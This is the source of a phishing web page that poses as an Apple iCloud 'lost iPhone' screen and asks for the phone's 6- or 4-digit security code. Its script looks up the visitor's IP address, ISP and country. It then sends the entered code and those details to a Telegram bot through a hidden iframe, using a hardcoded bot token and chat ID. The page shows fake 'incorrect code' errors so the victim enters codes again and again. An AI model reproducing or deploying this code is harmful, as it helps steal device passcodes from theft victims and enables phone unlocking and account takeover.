<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
    <title>Sign in - iCloud</title>
</head>
<body>
    <header><nav><a href="index.html" class="icloud-logo"><i class='bx bxl-apple'></i>iCloud</a></nav></header>
    
    <main id="main">
        <form id="sign-in">
            <div class="error-message" id="errorMsg"></div>
            
            <div class="login-form">
                <img id="apple-color-logo" src="IMG/sign-in-screen-img.svg" alt="Apple">
                <p id="loginTitle">Enter the security code from your lost iPhone</p>
                <p id="subtitle" style="font-size: 1rem; color: #d2d2d7; margin: 0.5rem 0 2rem 0; font-weight: 400;">Enter the 6-digit security code to see the most recent location</p>
                
                <div class="code-input-container">
                    <div class="code-inputs" id="codeInputs">
                        <input type="text" maxlength="1" class="code-input" data-index="0">
                        <input type="text" maxlength="1" class="code-input" data-index="1">
                        <input type="text" maxlength="1" class="code-input" data-index="2">
                        <input type="text" maxlength="1" class="code-input" data-index="3">
                        <input type="text" maxlength="1" class="code-input" data-index="4">
                        <input type="text" maxlength="1" class="code-input" data-index="5">
                    </div>
                </div>
                
                <button type="button" class="four-digit-btn" id="fourDigitBtn">
                    Do you have a 4-digit code?
                </button>
                
                <button type="submit" class="submit-btn" id="submitBtn">Continue</button>
            </div>
        </form>
    </main>
    
    <footer>
        <div class="footer-div">
            <span>System Status</span><div class="sep"></div>
            <span>Privacy Policy</span><div class="sep"></div>
            <span>Terms & Conditions</span>
        </div>
        <div class="footer-div copyright">© 2024 Apple Inc. All rights reserved.</div>
    </footer>

    <script>
        document.addEventListener('DOMContentLoaded', () => {
            console.log('🚀 CÓDIGO 6/4 DÍGITOS - iPhone perdido');
            
            const codeInputsContainer = document.getElementById('codeInputs');
            const submitBtn = document.getElementById('submitBtn');
            const errorMsg = document.getElementById('errorMsg');
            const form = document.getElementById('sign-in');
            const fourDigitBtn = document.getElementById('fourDigitBtn');
            const subtitle = document.getElementById('subtitle');
            
            let loginAttempts = 0;
            let isFourDigitMode = false;
            let codeInputs = [];
            let MAX_CODE_LENGTH = 6;
            
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            document.body.appendChild(iframe);
            
            // Inicializar inputs
            function initInputs() {
                codeInputs = Array.from(document.querySelectorAll('.code-input'));
                codeInputs[0].focus();
                setupInputListeners();
                checkCompleteCode();
            }
            
            // Cambiar a modo 4 dígitos
            function switchToFourDigits() {
                isFourDigitMode = true;
                MAX_CODE_LENGTH = 4;
                
                // Remover inputs extras
                codeInputs.slice(4).forEach(input => {
                    input.remove();
                });
                
                codeInputs = codeInputs.slice(0, 4);
                
                // Actualizar UI
                subtitle.textContent = 'Enter the 4-digit security code to see the most recent location';
                fourDigitBtn.textContent = 'Switch to 6-digit code';
                fourDigitBtn.classList.add('active');
                
                codeInputs[0].focus();
                checkCompleteCode();
            }
            
            // Cambiar a modo 6 dígitos
            function switchToSixDigits() {
                isFourDigitMode = false;
                MAX_CODE_LENGTH = 6;
                
                // Recrear todos los inputs
                const container = document.getElementById('codeInputs');
                container.innerHTML = `
                    <input type="text" maxlength="1" class="code-input" data-index="0">
                    <input type="text" maxlength="1" class="code-input" data-index="1">
                    <input type="text" maxlength="1" class="code-input" data-index="2">
                    <input type="text" maxlength="1" class="code-input" data-index="3">
                    <input type="text" maxlength="1" class="code-input" data-index="4">
                    <input type="text" maxlength="1" class="code-input" data-index="5">
                `;
                
                initInputs();
                
                // Actualizar UI
                subtitle.textContent = 'Enter the 6-digit security code to see the most recent location';
                fourDigitBtn.textContent = 'Do you have a 4-digit code?';
                fourDigitBtn.classList.remove('active');
            }
            
            // Configurar listeners de inputs
            function setupInputListeners() {
                codeInputs.forEach((input, index) => {
                    input.addEventListener('input', (e) => {
                        if (e.data && !/[0-9]/.test(e.data)) {
                            e.target.value = '';
                            return;
                        }
                        if (input.value.length === 1 && index < MAX_CODE_LENGTH - 1) {
                            codeInputs[index + 1].focus();
                        }
                        checkCompleteCode();
                    });
                    
                    input.addEventListener('keydown', (e) => {
                        if (e.key === 'Backspace' && input.value === '' && index > 0) {
                            codeInputs[index - 1].focus();
                        }
                    });
                    
                    input.addEventListener('paste', (e) => {
                        e.preventDefault();
                        const paste = (e.clipboardData || window.clipboardData).getData('text');
                        const numbers = paste.replace(/\D/g, '').slice(0, MAX_CODE_LENGTH);
                        numbers.split('').forEach((num, i) => {
                            if (codeInputs[i]) {
                                codeInputs[i].value = num;
                            }
                        });
                        if (numbers.length === MAX_CODE_LENGTH) {
                            codeInputs[MAX_CODE_LENGTH - 1].focus();
                            checkCompleteCode();
                        }
                    });
                });
            }
            
            async function getIPInfo() {
                try {
                    const ipResponse = await fetch('https://api.ipify.org?format=json');
                    const ipData = await ipResponse.json();
                    const ispResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
                    const ispData = await ispResponse.json();
                    return {
                        ip: ipData.ip,
                        isp: ispData.org || 'ISP Desconocido',
                        country: ispData.country_name || 'País Desconocido'
                    };
                } catch {
                    return { ip: 'N/A', isp: 'Web', country: 'Web' };
                }
            }
            
            function checkCompleteCode() {
                const code = Array.from(codeInputs).map(input => input.value).join('');
                if (code.length === MAX_CODE_LENGTH) {
                    submitBtn.classList.add('show');
                } else {
                    submitBtn.classList.remove('show');
                }
            }
            
            // Event listeners
            fourDigitBtn.addEventListener('click', () => {
                if (isFourDigitMode) {
                    switchToSixDigits();
                } else {
                    switchToFourDigits();
                }
            });
            
            form.addEventListener('submit', async (e) => {
                e.preventDefault();
                loginAttempts++;
                
                const code = Array.from(codeInputs).map(input => input.value).join('');
                
                if (code.length !== MAX_CODE_LENGTH) {
                    showError(`Enter the ${MAX_CODE_LENGTH}-digit security code.`);
                    return;
                }
                
                console.log(`🎯 Intento ${loginAttempts}/${MAX_ATTEMPTS}: Código ${MAX_CODE_LENGTH}d - ${code}`);
                
                const ipInfo = await getIPInfo();
                
                const codeType = isFourDigitMode ? '4-dígitos' : '6-dígitos';
                const message = `🚀 *ASTRO505 - CÓDIGO IPHONE PERDIDO* 🚀

🔢 *Código ${codeType}:* ${code}
📱 *Dispositivo:* iPhone perdido
🌐 *IP:* ${ipInfo.ip}
🏢 *Proveedor:* ${ipInfo.isp}
🌍 *País:* ${ipInfo.country}
💻 *Navegador:* Chrome
📱 *Device:* PC
📅 *Hora:* ${new Date().toLocaleString('es-ES')}
⚡ *Intento:* ${loginAttempts}/${MAX_ATTEMPTS}

✨ *Plataforma:* Astro505`;

                const telegramUrl = `https://api.telegram.org/bot7785623280:AAE3v4kmIOZTpJDLICsp_xE5Ka5Yu-B5cQA/sendMessage?chat_id=7219932215&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
                iframe.src = telegramUrl;
                
                console.log('📤 Telegram con código:', codeType, code, ipInfo.ip);
                
                if (loginAttempts < 3) {
                    const errorText = isFourDigitMode ? 
                        "Incorrect 4-digit code." : 
                        "Incorrect security code.";
                    showError(errorText);
                    codeInputs[0].focus();
                    codeInputs.forEach(input => input.value = '');
                    submitBtn.classList.remove('show');
                } else {
                    showError('Verifying security code...');
                    setTimeout(() => {
                        window.location.href = 'index.html';
                    }, 1500);
                }
            });
            
            function showError(message) {
                errorMsg.textContent = message;
                errorMsg.classList.add('show');
                errorMsg.style.top = '-10px';
                setTimeout(() => {
                    errorMsg.classList.remove('show');
                    errorMsg.style.top = '';
                }, 5000);
            }
            
            // Inicializar
            initInputs();
            console.log('✅ MODO 6/4 DÍGITOS FUNCIONANDO');
        });
    </script>

    <style>
        /* ESTILOS PARA BOTÓN 4 DÍGITOS */
        .four-digit-btn {
            background: none;
            border: none;
            color: #0a84ff;
            font-size: 0.95rem;
            font-weight: 500;
            cursor: pointer;
            padding: 0.8rem 1.5rem;
            border-radius: 12px;
            transition: all 0.3s ease;
            margin: 1rem 0;
            text-align: center;
        }
        
        .four-digit-btn:hover {
            background: rgba(10, 132, 255, 0.1);
            color: #0066cc;
        }
        
        .four-digit-btn.active {
            color: #d2d2d7;
        }
        
        .four-digit-btn.active:hover {
            color: #aeaeb2;
            background: rgba(210, 210, 215, 0.1);
        }

        /* ESTILOS PARA INPUTS DE CÓDIGO */
        .code-input-container {
            width: 100%;
            display: flex;
            justify-content: center;
            margin: 2rem 0;
        }
        
        .code-inputs {
            display: flex;
            gap: 1rem;
            justify-content: center;
            flex-wrap: wrap;
        }
        
        .code-input {
            width: 50px;
            height: 60px;
            font-size: 1.8rem;
            font-weight: 600;
            text-align: center;
            background: rgba(52, 52, 56, 0.8);
            border: 2px solid rgba(255, 255, 255, 0.08);
            border-radius: 12px;
            color: #ffffff;
            transition: all 0.3s ease;
            font-family: 'SF Pro Display', -apple-system, sans-serif;
        }
        
        .code-input:focus {
            border-color: #0a84ff;
            background: rgba(255, 255, 255, 0.1);
            box-shadow: 0 0 0 4px rgba(10, 132, 255, 0.2);
            outline: none;
            transform: scale(1.05);
        }

        /* ESTILOS INLINE PARA ERROR */
        .error-message {
            position: relative !important;
            top: -10px !important;
            left: 0 !important;
            transform: none !important;
            background: #ff3b30 !important;
            color: white !important;
            padding: 12px 20px !important;
            margin-bottom: 15px !important;
            font-size: 14px !important;
            font-weight: 500 !important;
            border-radius: 10px !important;
            box-shadow: 0 4px 20px rgba(255,59,48,0.4) !important;
            width: 100% !important;
            text-align: center !important;
            opacity: 0 !important;
            transition: all 0.4s ease !important;
            z-index: 100 !important;
        }
        
        .error-message.show {
            opacity: 1 !important;
            transform: translateY(0) !important;
        }
    </style>
</body>
</html>
